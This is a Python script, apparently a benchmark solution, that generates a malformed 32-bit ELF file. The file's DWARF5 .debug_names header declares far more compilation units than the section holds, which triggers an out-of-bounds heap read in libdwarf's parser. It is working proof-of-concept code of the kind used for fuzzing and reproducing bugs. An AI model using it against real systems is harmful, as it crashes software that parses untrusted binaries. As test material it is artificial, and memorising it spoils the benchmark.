import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a proof-of-concept (PoC) that triggers a heap-buffer-overflow
        in libdwarf's DWARF5 .debug_names parser (oss-fuzz:383170474).

        The vulnerability stems from an inadequate bounds check when reading
        compilation unit (CU) offsets. The parser reads a `comp_unit_count`
        from the section header and then enters a loop to read that many offsets.
        If the section size is smaller than implied by this count, the loop
        reads past the end of the section's buffer.

        This PoC constructs a minimal 32-bit ELF file containing a malicious
        .debug_names section. This section's header declares a large number of
        CUs but the section data itself is truncated to only include the header.
        This mismatch causes the vulnerable parser to perform an out-of-bounds read.
        A 32-bit ELF format is chosen over 64-bit to minimize the PoC's final size.
        """
        # 1. Craft the malicious .debug_names section payload.
        # A large comp_unit_count with no corresponding data causes the OOB read.
        comp_unit_count = 0x10000
        # The DWARF header fields after `unit_length` sum to 32 bytes.
        # `unit_length` is the size of the section *excluding* the length field itself.
        header_data_size = 32
        unit_length = header_data_size
        
        debug_names_payload = struct.pack(
            '<IHHIIIIIII',
            unit_length,             # unit_length (32)
            5,                       # version (DWARF5)
            0,                       # padding
            comp_unit_count,         # comp_unit_count
            0,                       # local_type_unit_count
            0,                       # foreign_type_unit_count
            0,                       # bucket_count (0 to skip)
            0,                       # name_count (0 to skip)
            0,                       # abbrev_table_size
            0                        # augmentation_string_size
        )
        debug_names_size = len(debug_names_payload)

        # 2. Create the section header string table (.shstrtab).
        shstrtab_content = b'\x00.debug_names\x00.shstrtab\x00'
        shstrtab_size = len(shstrtab_content)
        debug_names_name_offset = 1
        shstrtab_name_offset = 14  # Offset of ".shstrtab"

        # 3. Define the layout of the minimal 32-bit ELF file.
        elf_header_size = 52
        sht_entry_size = 40
        num_sections = 3  # NULL, .debug_names, .shstrtab
        sht_size = num_sections * sht_entry_size

        sht_offset = elf_header_size
        data_offset = sht_offset + sht_size
        debug_names_offset = data_offset
        shstrtab_offset = debug_names_offset + debug_names_size

        # 4. Construct the 32-bit ELF header.
        elf_header = struct.pack(
            '<16sHHIIIIIHHHHHH',
            b'\x7fELF\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00', # e_ident
            1,                       # e_type (ET_REL)
            3,                       # e_machine (EM_386)
            1,                       # e_version
            0,                       # e_entry
            0,                       # e_phoff
            sht_offset,              # e_shoff
            0,                       # e_flags
            elf_header_size,         # e_ehsize
            0,                       # e_phentsize
            0,                       # e_phnum
            sht_entry_size,          # e_shentsize
            num_sections,            # e_shnum
            num_sections - 1         # e_shstrndx (index of .shstrtab)
        )

        # 5. Construct the Section Header Table (SHT).
        shent_format = '<IIIIIIIIII'

        shent_null = struct.pack(shent_format, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)

        shent_debug_names = struct.pack(
            shent_format,
            debug_names_name_offset, # sh_name
            1,                       # sh_type (SHT_PROGBITS)
            0,                       # sh_flags
            0,                       # sh_addr
            debug_names_offset,      # sh_offset
            debug_names_size,        # sh_size
            0, 0, 1, 0               # link, info, addralign, entsize
        )

        shent_shstrtab = struct.pack(
            shent_format,
            shstrtab_name_offset,    # sh_name
            3,                       # sh_type (SHT_STRTAB)
            0,                       # sh_flags
            0,                       # sh_addr
            shstrtab_offset,         # sh_offset
            shstrtab_size,           # sh_size
            0, 0, 1, 0               # link, info, addralign, entsize
        )

        sht = shent_null + shent_debug_names + shent_shstrtab

        # 6. Assemble the final PoC file.
        poc = bytearray()
        poc.extend(elf_header)
        poc.extend(sht)
        poc.extend(b'\x00' * (data_offset - len(poc))) # Padding if needed
        poc.extend(debug_names_payload)
        poc.extend(shstrtab_content)

        return bytes(poc)
